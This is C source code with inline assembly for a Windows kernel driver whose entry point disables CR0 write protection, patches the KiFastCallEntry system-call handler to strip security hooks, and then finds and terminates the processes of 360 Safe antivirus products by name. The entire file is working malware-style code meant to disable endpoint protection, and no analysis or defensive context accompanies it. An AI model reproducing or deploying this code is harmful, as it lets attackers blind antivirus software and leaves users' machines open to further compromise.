#include <ntddk.h>

NTSTATUS
	PsLookupProcessByProcessId(
	IN HANDLE ProcessId,
	OUT PEPROCESS *Process
	);
ULONG SearchProcessByName(const char* ProcessName)
{
	ULONG i = 0;
	PEPROCESS hProcess;
	for(i=0;i<65535;i+=4)
	{
		if(PsLookupProcessByProcessId((HANDLE)i,&hProcess)==STATUS_SUCCESS)
		{
			//DbgPrint("%20s\n",(char*)((ULONG)hProcess+0x16c));
			if (strcmp(ProcessName,(char*)((ULONG)hProcess+0x16c)) == 0 && *(ULONG*)((ULONG)hProcess+0x198)!=0)
				return *(ULONG*)((ULONG)hProcess+0xb4);
		}
	}
	return NULL;
}

void PageProtectOn()
{
	__asm
	{
		mov eax,cr0
			or eax,100000h
			mov cr0,eax
			sti
	}
}
void PageProtectOff()
{
	__asm
	{
		cli
			mov eax,cr0
			and	eax,not	10000h
			mov cr0,eax
	}
}
VOID ZwKillProcess(ULONG ulProcessID);
VOID Terminate();
VOID UnHook();
void DriverUnload(PDRIVER_OBJECT driver)
{
}
NTSTATUS DriverEntry(PDRIVER_OBJECT driver,PUNICODE_STRING reg_path)
{	
	UnHook();
	Terminate();
	driver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}
void UnHook()
{
	ULONG KifastcallAddress = NULL;
	_asm
	{
		mov ecx,0x176
			rdmsr
			mov KifastcallAddress,eax
	}
	KifastcallAddress = KifastcallAddress + 0xE4;

	if(*(ULONG*)KifastcallAddress != 0xE9C1E12B)
	{
		if(*(UCHAR*)(KifastcallAddress+0x4) != 0x02)
		{
			PageProtectOff();
			*(ULONG*)KifastcallAddress = 0xE9C1E12B;
			*(UCHAR*)(KifastcallAddress+0x4) = 0x02;
			PageProtectOn();
		}
		else
		{
			PageProtectOff();
			*(ULONG*)KifastcallAddress = 0xE9C1E12B;
			PageProtectOn();
		}
		if(*(UCHAR*)(KifastcallAddress+0x279) != 0x05)
		{
			PageProtectOff();
			*(UCHAR*)(KifastcallAddress+0x279) = 0x05;
			PageProtectOn();
		}
	}
	
}
void Terminate()
{
	ULONG pid[8] = {0};
	int i = 0;
	pid[0] = SearchProcessByName("ZhuDongFangYu.");
	pid[1] = SearchProcessByName("360Safe.exe");
	pid[2] = SearchProcessByName("360Tray.exe");
	pid[3] = SearchProcessByName("360tray.exe");
	pid[4] = SearchProcessByName("360speedld.exe");
	pid[5] = SearchProcessByName("LiveUpdate360.");
	pid[6] = SearchProcessByName("360UHelper.exe");
	pid[7] = SearchProcessByName("SoftMgrLite.ex");
	for(i=0;i<8;i++)
	{
		if(pid[i] != 0)
			ZwKillProcess(pid[i]);
	}
}
//正规方法结束进程
void ZwKillProcess(ULONG ulProcessID)
{
	HANDLE hProcess = NULL;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES oa;
	//填充 CID
	ClientId.UniqueProcess = (HANDLE)ulProcessID; //这里修改为你要的 PID
	ClientId.UniqueThread = 0;
	//填充 OA
	oa.Length = sizeof(oa);
	oa.RootDirectory = 0;
	oa.ObjectName = 0;
	oa.Attributes = 0;
	oa.SecurityDescriptor = 0;
	oa.SecurityQualityOfService = 0;
	//打开进程，如果句柄有效，则结束进程
	ZwOpenProcess(&hProcess, 1, &oa, &ClientId);
	if (hProcess)
	{
		ZwTerminateProcess(hProcess, 0);
		ZwClose(hProcess);
	}
}
